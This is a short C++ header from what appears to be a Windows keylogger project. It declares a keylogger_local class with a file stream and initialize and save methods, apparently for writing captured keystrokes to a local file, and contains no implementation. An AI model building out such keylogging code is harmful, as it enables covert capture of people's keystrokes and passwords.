#ifndef KEYLOGGER_LOCAL_HPP_
#define KEYLOGGER_LOCAL_HPP_

#include "../keylogger.hpp"

using namespace std;

class keylogger_local : virtual public keylogger
{
    private:
		ofstream a_ofstream;

    public:
		keylogger_local();
		virtual ~keylogger_local();

		virtual void initialize();

		virtual void save(LPCSTR);
};

#endif
